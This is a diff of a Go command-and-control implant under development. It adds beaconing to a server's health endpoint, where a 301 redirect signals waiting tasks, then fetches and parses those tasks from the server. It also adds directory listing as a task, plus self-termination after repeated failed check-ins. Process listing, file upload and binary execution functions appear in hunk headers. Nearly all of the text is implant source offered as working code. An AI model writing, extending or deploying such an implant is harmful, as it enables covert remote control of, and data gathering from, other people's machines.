@@ -2,19 +2,20 @@ package main
 
 import (
 	"bytes"
-	crand "crypto/rand"  
+	crand "crypto/rand"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	mathrand "math/rand"  
+	mathrand "math/rand"
 	"net/http"
 	"os"
+	"io"
 	"os/user"
+	"os/exec"
 	"time"
-	"bufio"
-    "net"
-    "strconv"
-    "strings"
+	"net"
+	"strconv"
+	"strings"
 )
 
 var rng = mathrand.New(mathrand.NewSource(time.Now().UnixNano())) 
@@ -53,22 +54,74 @@ func GatherInfo() InitialInfo {
 	return hostInfo
 }
 
+func ParseTasks(tasking string) (string, error) {
+	var tasks []map[string]interface{}
+	err := json.Unmarshal([]byte(tasking), &tasks)
+	if err != nil {
+		return "", err
+	}
+
+	for _, taskData := range tasks {
+		fmt.Printf("Task ID: %v\n", taskData["id"])
+		fmt.Printf("Task: %v\n", taskData["task"])
+		fmt.Printf("Args: %v\n", taskData["args"])
+                if taskData["task"] == "ls" {
+                        dir, err := listDirectories(taskData["args"].(string))
+                        if err != nil {
+                                fmt.Println("Error listing directories:", err)
+                                return "", err
+                        }
+                        //marshalOutput(taskData["id"].(int), taskData["task"].(string), dir)
+                        fmt.Println(dir)
+
+                }
+
+	}
+	return "", nil
+}
+
+func FetchTasking(serverAddr string, session string) (string, error) {
+        url := fmt.Sprintf("%s/tasks/%s", serverAddr, session)
+
+        resp, err := http.Get(url)
+        if err != nil {
+                return "", err
+        }
+        defer resp.Body.Close()
+        bodyBytes, err := io.ReadAll(resp.Body)
+        if err != nil {
+                return "", err
+        }
+        bodyString := string(bodyBytes)
+        fmt.Println(bodyString)
+        return bodyString, nil
+}
+
 func CheckIn(serverAddr string, session string) (int, error) {
 	url := fmt.Sprintf("%s/health/%s", serverAddr, session)
-	resp, err := http.Get(url)
+        // Prevent auto redirects so if there is tasking 301 is actually returned and 
+        // we can fetch tasking, otherwise the main function will just return 200
+        // and we will never get the tasking
+        client := &http.Client{
+                CheckRedirect: func(req *http.Request, via []*http.Request) error {
+                        return http.ErrUseLastResponse
+                },
+        }
+
+	resp, err := client.Get(url)
 	if err != nil {
 		return 0, nil
 	}
 	defer resp.Body.Close()
-
-	return 200, nil
+        fmt.Println("Check-in response:", resp.StatusCode)
+	return resp.StatusCode, nil
 }
 
 func TerminateImplant() {
 	// Get the name of your implant
 	// Get the pwd the implant if running from 
 	// Check to see if it is on disk, if so remove, if not then just kill yourself
-	return nil
+	os.Exit(0)
 }
 
 func PostJson(url string, payload interface{}) (int, error) {
@@ -189,24 +242,27 @@ func get_ps(conn net.Conn) {
         fmt.Fprintf(conn, "__END__\n")
 }
 
-func listDirectories(conn net.Conn, path string) {
+//func marshalOutput(taskId int, task string, output []string)
+        // add completed and add datetime of completion
+        //outputData := json.Marshal("") 
 
-        dir, err := os.Open(path)
+func listDirectories(directory string) ([]string, error){
+        fileList := []string{}
+        dir, err := os.Open(directory)
         if err != nil {
-                fmt.Fprintf(conn, "[!] %v\n__END__\n", err)
-                return
+                return []string{}, err
         }
         defer dir.Close()
 
         files, err := dir.Readdir(-1)
         if err != nil {
-                fmt.Fprintf(conn, "[!] %v\n__END__\n", err)
+                return []string{}, err
         }
         for _, file := range files {
                 line := fmt.Sprintf("%-15s %-22v %-10d %-20s\n", file.Mode(), file.ModTime().UTC().Format(time.RFC3339), file.Size(), file.Name())
-                fmt.Fprintf(conn, "%v", line)
+                fileList = append(fileList, line)
         }
-        fmt.Fprintf(conn, "__END__\n")
+        return fileList, nil
 }
 
 func uploadFile(conn net.Conn, remotePath string, fSize string) {
@@ -292,7 +348,7 @@ func execBinary(conn net.Conn, binPath string, args []string, background bool) {
         fmt.Fprintf(conn, "%s", "__END__\n")
 
 }
-
+/*
 func handleConnection(conn net.Conn) {
         defer conn.Close()
 
@@ -324,6 +380,7 @@ func handleConnection(conn net.Conn) {
                 }
         }
 }
+*/
 
 
 func main() {
@@ -352,14 +409,34 @@ func main() {
 
 		<-timer.C
 		resp, err := CheckIn(serverUrl, initialInfo.Session)
+                if err != nil{
+                        fmt.Printf("Error checking in: %v\n", err)
+                        retryCounter += 1
+                        if retryCounter >= callbackTimer.SelfTerminate {
+                                TerminateImplant()
+                        }
+                        continue
+                }
+                if resp != 200 && resp != 301 {
+                        fmt.Printf("Unexpected response: %v\n", resp)
+                        retryCounter += 1
+                        if retryCounter >= callbackTimer.SelfTerminate {
+                                TerminateImplant()
+                        }
+                        continue
+                }
+                if resp == 301 {
+                        // we have tasking
+                        tasking, err := FetchTasking(serverUrl, initialInfo.Session)
+                        if err != nil {
+                                fmt.Printf("Error fetching tasking: %v\n", err)
+                        } else {
+                                ParseTasks(tasking)
+                        }
+                        continue
+                }
 		fmt.Println("Check-in fired")
-		if resp != 200 || resp != 302 {
-			retryCounter += 1
-			if retryCounter >= callbackTimer.SelfTerminate {
-				TerminateImplant()
-			}
-		}
-
+                retryCounter = 0
 		timer.Stop()
 	}
 }
